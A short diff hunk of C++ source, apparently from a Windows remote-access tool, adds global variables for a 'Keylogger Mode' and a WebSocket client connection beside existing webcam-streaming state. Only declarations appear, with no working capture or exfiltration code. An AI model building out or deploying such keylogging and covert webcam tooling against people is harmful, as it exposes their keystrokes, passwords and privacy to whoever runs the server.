@@ -8,6 +8,12 @@ std::set<DWORD> g_PendingModifiers;
 bool g_IsStreaming = false;
 std::thread* g_WebcamThread = nullptr;
 
+// Keylogger Mode
+std::string g_KeylogMode = "buffer"; // Mặc định: buffer mode
+server* g_ServerPtr = nullptr;
+websocketpp::connection_hdl g_ClientHdl;
+bool g_ClientConnected = false;
+
 // TRIỂN KHAI HÀM TIỆN ÍCH
 // Chuyển chuỗi sang chữ thường
 std::string ToLower(std::string str) {
